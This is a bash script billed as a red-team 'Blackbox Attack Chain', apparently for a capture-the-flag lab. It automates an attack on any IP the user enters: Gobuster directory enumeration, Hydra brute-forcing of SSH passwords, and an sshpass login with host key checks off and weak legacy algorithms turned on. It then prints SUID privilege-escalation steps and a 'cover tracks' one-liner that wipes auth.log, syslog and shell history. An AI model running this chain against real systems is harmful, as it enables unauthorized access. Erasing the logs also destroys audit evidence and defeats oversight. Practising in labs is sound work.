#!/bin/bash

# =============================================================
# IRTx Red Team - Blackbox Attack Chain
# DataBreach | Red Team Playbook
# =============================================================

RED='\033[0;31m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
RESET='\033[0m'

# --- Banner ---
echo -e "${RED}"
echo "  ██████╗ ██╗      █████╗  ██████╗██╗  ██╗██████╗  ██████╗ ██╗  ██╗"
echo "  ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔═══██╗╚██╗██╔╝"
echo "  ██████╔╝██║     ███████║██║     █████╔╝ ██████╔╝██║   ██║ ╚███╔╝ "
echo "  ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██╔══██╗██║   ██║ ██╔██╗ "
echo "  ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗██████╔╝╚██████╔╝██╔╝ ██╗"
echo "  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝"
echo -e "${CYAN}           IRTx Red Team — Blackbox Attack Chain${RESET}"
echo -e "${YELLOW}                      DataBreach${RESET}"
echo ""

# --- Privilege Check ---
if [[ $EUID -ne 0 ]]; then
  echo -e "${RED}[!] Run as root: sudo ./blackbox.sh${RESET}"
  exit 1
fi

echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${BOLD}${YELLOW}  Attack Chain: Gobuster → Hydra → SSH → Escalation → Root${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""

# =============================================================
# STAGE 1 — TARGET DETAILS
# =============================================================
echo -e "${YELLOW}[?] Enter Blackbox target IP:${RESET}"
read -r TARGET

echo ""
echo -e "${YELLOW}[?] Enter web port ${BOLD}(default: 8080)${RESET}${YELLOW}:${RESET}"
read -r WEB_PORT
WEB_PORT=${WEB_PORT:-8080}

echo ""
echo -e "${YELLOW}[?] Enter SSH port ${BOLD}(default: 2222)${RESET}${YELLOW}:${RESET}"
read -r SSH_PORT
SSH_PORT=${SSH_PORT:-2222}

# =============================================================
# STAGE 2 — WEB ENUMERATION (Gobuster)
# =============================================================
echo ""
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${BOLD}${MAGENTA}  STAGE 1 — Web Enumeration (Gobuster)${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "  ${YELLOW}Target URL :${RESET} ${BOLD}${RED}http://$TARGET:$WEB_PORT${RESET}"
echo -e "  ${YELLOW}Wordlist   :${RESET} /usr/share/wordlists/dirb/common.txt"
echo ""
echo -e "${YELLOW}[?] Launch Gobuster? ${BOLD}(y/n)${RESET}${YELLOW}:${RESET}"
read -r GO_CONFIRM

if [[ "$GO_CONFIRM" == "y" || "$GO_CONFIRM" == "Y" ]]; then
  echo ""
  echo -e "${MAGENTA}[>] Running Gobuster...${RESET}"
  echo ""
  gobuster dir \
    -u "http://$TARGET:$WEB_PORT" \
    -w /usr/share/wordlists/dirb/common.txt \
    -o gobuster_results.txt \
    --no-error \
    -q
  echo ""
  echo -e "${GREEN}[✓] Gobuster complete — results saved to ${BOLD}gobuster_results.txt${RESET}"
  echo ""
  echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
  echo -e "${BOLD}${YELLOW}  MANUAL STEP — Check robots.txt for hints:${RESET}"
  echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
  echo -e "  ${CYAN}►${RESET} Open browser: ${BOLD}http://$TARGET:$WEB_PORT/robots.txt${RESET}"
  echo -e "  ${CYAN}►${RESET} Note down the ${BOLD}username hint${RESET} from the page"
  echo -e "  ${CYAN}►${RESET} Google the hint to find the username"
  echo ""
else
  echo -e "${YELLOW}[~] Gobuster skipped.${RESET}"
fi

# =============================================================
# STAGE 3 — BRUTE FORCE SSH (Hydra)
# =============================================================
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${BOLD}${MAGENTA}  STAGE 2 — Brute Force SSH (Hydra)${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""
echo -e "${YELLOW}[?] Enter username found from robots.txt hint:${RESET}"
read -r USERNAME

echo ""
echo -e "${YELLOW}[?] Enter wordlist path ${BOLD}(default: /usr/share/wordlists/fasttrack.txt)${RESET}${YELLOW}:${RESET}"
read -r WORDLIST
WORDLIST=${WORDLIST:-/usr/share/wordlists/fasttrack.txt}

echo ""
echo -e "  ${YELLOW}Target     :${RESET} ${BOLD}${RED}ssh://$TARGET:$SSH_PORT${RESET}"
echo -e "  ${YELLOW}Username   :${RESET} ${BOLD}${CYAN}$USERNAME${RESET}"
echo -e "  ${YELLOW}Wordlist   :${RESET} $WORDLIST"
echo ""
echo -e "${YELLOW}[?] Launch Hydra? ${BOLD}(y/n)${RESET}${YELLOW}:${RESET}"
read -r HY_CONFIRM

if [[ "$HY_CONFIRM" == "y" || "$HY_CONFIRM" == "Y" ]]; then
  echo ""
  echo -e "${MAGENTA}[>] Running Hydra...${RESET}"
  echo ""
  hydra -I \
    -l "$USERNAME" \
    -P "$WORDLIST" \
    -t 3 \
    ssh://"$TARGET":"$SSH_PORT"
  echo ""
  echo -e "${GREEN}[✓] Hydra complete — note the cracked password above.${RESET}"
else
  echo -e "${YELLOW}[~] Hydra skipped.${RESET}"
fi

# =============================================================
# STAGE 4 — SSH INTO BLACKBOX
# =============================================================
echo ""
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${BOLD}${MAGENTA}  STAGE 3 — SSH Login${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""
echo -e "${YELLOW}[?] Enter cracked password from Hydra:${RESET}"
read -r PASSWORD

echo ""
echo -e "  ${YELLOW}SSH Command :${RESET} ${BOLD}${CYAN}ssh $USERNAME@$TARGET -p $SSH_PORT${RESET}"
echo ""
echo -e "${YELLOW}[?] Connect now? ${BOLD}(y/n)${RESET}${YELLOW}:${RESET}"
read -r SSH_CONFIRM

if ! command -v sshpass &> /dev/null; then
  echo -e "${YELLOW}[+] Installing sshpass...${RESET}"
  DEBIAN_FRONTEND=noninteractive apt-get install -y sshpass > /dev/null 2>&1
  echo -e "${GREEN}[✓] sshpass ready.${RESET}"
fi

if [[ "$SSH_CONFIRM" == "y" || "$SSH_CONFIRM" == "Y" ]]; then
  echo ""
  echo -e "${MAGENTA}[>] Connecting to $TARGET as $USERNAME...${RESET}"
  echo -e "${YELLOW}    Do your manual steps inside, then type exit to return.${RESET}"
  echo ""
  # Pre-accept host key
  ssh-keyscan -p "$SSH_PORT" "$TARGET" >> ~/.ssh/known_hosts 2>/dev/null
  # Connect with password
  sshpass -p "$PASSWORD" ssh \
    -o StrictHostKeyChecking=no \
    -o KexAlgorithms=+diffie-hellman-group1-sha1 \
    -o HostKeyAlgorithms=+ssh-rsa \
    "$USERNAME"@"$TARGET" -p "$SSH_PORT"
fi

# =============================================================
# STAGE 5 — PRIVILEGE ESCALATION GUIDE
# =============================================================
echo ""
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${BOLD}${MAGENTA}  STAGE 4 — Privilege Escalation Reminder${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""
echo -e "  ${CYAN}►${RESET} ${BOLD}Step 1${RESET} — Find SUID binaries on the target:"
echo -e "          ${YELLOW}find / -perm /4000 2>/dev/null${RESET}"
echo ""
echo -e "  ${CYAN}►${RESET} ${BOLD}Step 2${RESET} — Look for anything unusual in the list"
echo -e "          Normal:     ${GREEN}passwd, sudo, su${RESET}"
echo -e "          Suspicious: ${RED}nano, vim, find, python, bash${RESET}"
echo ""
echo -e "  ${CYAN}►${RESET} ${BOLD}Step 3${RESET} — Look up the suspicious binary on GTFOBins:"
echo -e "          ${BOLD}${CYAN}https://gtfobins.github.io${RESET}"
echo -e "          Search the binary → click ${BOLD}SUID${RESET} tab → run the command"
echo ""
echo -e "  ${CYAN}►${RESET} ${BOLD}Step 4${RESET} — Find the flag once root:"
echo -e "          ${YELLOW}find / -name flag.txt 2>/dev/null${RESET}"
echo ""

# =============================================================
# STAGE 6 — COVER TRACKS REMINDER
# =============================================================
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${BOLD}${RED}  STAGE 5 — Cover Tracks (run before exit)${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""
echo -e "  ${CYAN}►${RESET} Run this one-liner ${BOLD}on the target as root${RESET} before exiting:"
echo ""
echo -e "  ${YELLOW}cat /dev/null > /var/log/auth.log; cat /dev/null > /var/log/syslog; cat /dev/null > ~/.bash_history; history -c${RESET}"
echo ""
echo -e "  ${CYAN}►${RESET} Then type: ${BOLD}${GREEN}exit${RESET}"
echo ""

# =============================================================
# DONE
# =============================================================
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${BOLD}${GREEN}  Script done — rest is manual. Good Hunting!${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""
